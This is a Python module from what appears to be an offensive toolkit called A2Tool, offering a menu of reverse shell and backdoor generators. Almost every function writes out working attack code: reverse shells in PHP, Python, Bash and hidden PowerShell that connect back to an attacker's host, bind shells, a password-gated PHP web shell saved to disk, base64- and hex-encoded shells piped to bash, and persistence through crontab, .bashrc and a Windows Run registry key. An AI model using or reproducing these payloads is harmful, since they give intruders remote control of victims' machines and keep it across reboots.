#!/usr/bin/env python3
"""
A2Tool v4.0 - Reverse Shell & Backdoor Tools Module (12 Tools)
Author: Ayush Rajdev & Anzar Iqbal
"""

import os, sys, subprocess, re, json, time, socket
from datetime import datetime
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except:
    class Fore: RED=GREEN=YELLOW=BLUE=MAGENTA=CYAN=WHITE='';RESET=''
    Style=Fore

R=Fore.RED; G=Fore.GREEN; Y=Fore.YELLOW; B=Fore.BLUE
M=Fore.MAGENTA; C=Fore.CYAN; W=Fore.WHITE; RS=Style.RESET_ALL

def _run(cmd, shell=True, timeout=30):
    try: return subprocess.check_output(cmd, shell=shell, stderr=subprocess.STDOUT, timeout=timeout).decode('utf-8', errors='ignore')
    except: return ''

def _get_lhost_lport():
    lhost = input(f"  {W}[?] LHOST (your IP): {RS}").strip()
    lport = input(f"  {W}[?] LPORT: {RS}").strip()
    return lhost, lport

def menu():
    while True:
        print(f"\n{R}╔══════════════════════════════════════════════════════════════╗{RS}")
        print(f"{R}║{W}            Reverse Shell & Backdoor Tools                  {R}║{RS}")
        print(f"{R}╠══════════════════════════════════════════════════════════════╣{RS}")
        print(f"{R}║{W} [01]{R}  Netcat Listener Setup                              {R}║{RS}")
        print(f"{R}║{W} [02]{R}  Multi-Handler (Metasploit)                         {R}║{RS}")
        print(f"{R}║{W} [03]{R}  PHP Reverse Shell                                  {R}║{RS}")
        print(f"{R}║{W} [04]{R}  Python Reverse Shell                               {R}║{RS}")
        print(f"{R}║{W} [05]{R}  Bash Reverse Shell                                 {R}║{RS}")
        print(f"{R}║{W} [06]{R}  PowerShell Reverse Shell                           {R}║{RS}")
        print(f"{R}║{W} [07]{R}  Bind Shell Generator                               {R}║{RS}")
        print(f"{R}║{W} [08]{R}  Web Shell Generator                                {R}║{RS}")
        print(f"{R}║{W} [09]{R}  Encoded/Encrypted Shell                            {R}║{RS}")
        print(f"{R}║{W} [10]{R}  Listener Manager                                   {R}║{RS}")
        print(f"{R}║{W} [11]{R}  Payload Obfuscator                                {R}║{RS}")
        print(f"{R}║{W} [12]{R}  Persistent Backdoor Installer                     {R}║{RS}")
        print(f"{R}║{W} [0]{R}   Back to Main Menu                                  {R}║{RS}")
        print(f"{R}╚══════════════════════════════════════════════════════════════╝{RS}")
        ch = input(f"\n{Y}  A2Tool[Shell] » {RS}").strip()
        if ch == '0': break
        elif ch == '1': nc_listener()
        elif ch == '2': multi_handler()
        elif ch == '3': php_shell()
        elif ch == '4': python_shell()
        elif ch == '5': bash_shell()
        elif ch == '6': powershell_shell()
        elif ch == '7': bind_shell()
        elif ch == '8': web_shell_gen()
        elif ch == '9': encoded_shell()
        elif ch == '10': listener_manager()
        elif ch == '11': payload_obfuscator()
        elif ch == '12': persistent_backdoor()
        else: print(f"{R}[!] Invalid option{RS}")

def nc_listener():
    port = input(f"  {W}[?] Port to listen on: {RS}").strip() or '4444'
    print(f"\n{G}[+] Netcat Listener Setup{RS}")
    print(f"  nc -lvnp {port}")
    print(f"  rlwrap nc -lvnp {port}")
    print(f"  ncat -lvnp {port} --ssl")
    if input(f"\n{Y}[?] Start? (y/n): {RS}").strip().lower() == 'y':
        os.system(f'nc -lvnp {port}')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def multi_handler():
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    payload = input(f"  {W}[?] Payload (default: windows/meterpreter/reverse_tcp): {RS}").strip() or 'windows/meterpreter/reverse_tcp'
    rc = f"use exploit/multi/handler\nset PAYLOAD {payload}\nset LHOST {lhost}\nset LPORT {lport}\nexploit -j\n"
    with open('handler.rc', 'w') as f: f.write(rc)
    print(f"{G}[+] handler.rc saved. Run: msfconsole -r handler.rc{RS}")
    if input(f"{Y}[?] Start now? (y/n): {RS}").strip().lower() == 'y':
        os.system(f'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD {payload}; set LHOST {lhost}; set LPORT {lport}; exploit"')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def php_shell():
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    code = f'<?php set_time_limit(0);$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");?>'
    with open('rshell.php', 'w') as f: f.write(code)
    print(f"{G}[+] rshell.php saved{RS}")
    print(f"  One-liner: php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def python_shell():
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    code = f'import socket,subprocess,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
    with open('rshell.py', 'w') as f: f.write(code)
    print(f"{G}[+] rshell.py saved{RS}")
    print(f"  One-liner: python -c '{code}'")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bash_shell():
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    print(f"{G}[+] Bash Reverse Shells:{RS}")
    print(f"  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
    print(f"  exec 5<>/dev/tcp/{lhost}/{lport}; cat <&5 | while read line; do $line 2>&5 >&5; done")
    print(f"  0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def powershell_shell():
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    print(f"{G}[+] PowerShell Reverse Shell:{RS}")
    print(f'  powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient(\'{lhost}\',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}};$c.Close()"')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def bind_shell():
    port = input(f"  {W}[?] Port: {RS}").strip() or '4444'
    print(f"{G}[+] Bind Shells:{RS}")
    print(f"  Python: python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",{port}));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'")
    print(f"  Netcat: nc -lvnp {port} -e /bin/sh")
    print(f"  Socat: socat TCP-LISTEN:{port},reuseaddr,fork EXEC:sh")
    print(f"  Connect: nc -v TARGET {port}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def web_shell_gen():
    print(f"{G}[+] Web Shell Generator{RS}")
    passwd = input(f"  {W}[?] Password: {RS}").strip() or 'a2tool'
    php = f'<?php $p="{passwd}";if($_POST["p"]===$p){{system($_GET["cmd"]);}}?>'
    asp = f'<%Dim p:"{passwd}":If Request.Form("p")=p Then:Set o=CreateObject("Wscript.Shell"):Response.Write(o.Exec("cmd /c "&Request.QueryString("cmd")).StdOut.ReadAll()):End If%>'
    with open('webshell.php', 'w') as f: f.write(php)
    print(f"{G}[+] webshell.php saved. Access: webshell.php?cmd=whoami{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def encoded_shell():
    import base64
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    b64 = base64.b64encode(payload.encode()).decode()
    print(f"{G}[+] Encoded Shells:{RS}")
    print(f"  Base64: echo '{b64}' | base64 -d | bash")
    hex_enc = payload.encode().hex()
    print(f"  Hex: echo '{hex_enc}' | xxd -r -p | bash")
    double = base64.b64encode(base64.b64encode(payload.encode())).decode()
    print(f"  Double B64: echo '{double}' | base64 -d | base64 -d | bash")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def listener_manager():
    port = input(f"  {W}[?] Port: {RS}").strip() or '4444'
    print(f"{G}[+] Starting listener on port {port}... (Ctrl+C to stop){RS}")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', int(port)))
        s.listen(5)
        print(f"{G}[+] Listening on 0.0.0.0:{port}{RS}")
        while True:
            conn, addr = s.accept()
            print(f"{G}[+] Connection from {addr[0]}:{addr[1]}{RS}")
            conn.send(b"A2Tool Shell\n> ")
            while True:
                try:
                    data = conn.recv(1024)
                    if not data: break
                    print(data.decode('utf-8', errors='ignore'), end='')
                except: break
            conn.close()
    except KeyboardInterrupt:
        print(f"\n{Y}[+] Listener stopped{RS}")
    except Exception as e:
        print(f"{R}[-] Error: {e}{RS}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def payload_obfuscator():
    payload = input(f"  {W}[?] Payload to obfuscate: {RS}").strip()
    import base64
    print(f"{G}[+] Obfuscation:{RS}")
    print(f"  Reversed: echo '{payload[::-1]}' | rev")
    print(f"  Hex: {payload.encode().hex()}")
    print(f"  Base64: {base64.b64encode(payload.encode()).decode()}")
    ip_match = re.search(r'\d+\.\d+\.\d+\.\d+', payload)
    if ip_match:
        ip = ip_match.group()
        dec = sum(int(x) * 256**(3-i) for i, x in enumerate(ip.split('.')))
        print(f"  IP Decimal: {dec}")
    input(f"\n{Y}[+] Press Enter to continue...{RS}")

def persistent_backdoor():
    lhost, lport = _get_lhost_lport()
    if not lhost or not lport: return
    print(f"{G}[+] Persistence Methods:{RS}")
    print(f"\n  {W}Linux:{RS}")
    print(f"  (crontab -l 2>/dev/null; echo '@reboot bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"') | crontab -")
    print(f"  echo 'bash -c \"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\"' >> ~/.bashrc")
    print(f"\n  {W}Windows:{RS}")
    print(f'  reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v A2Tool /t REG_SZ /d "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ..."')
    print(f'  Copy to: C:\\Users\\[User]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\')
    input(f"\n{Y}[+] Press Enter to continue...{RS}")
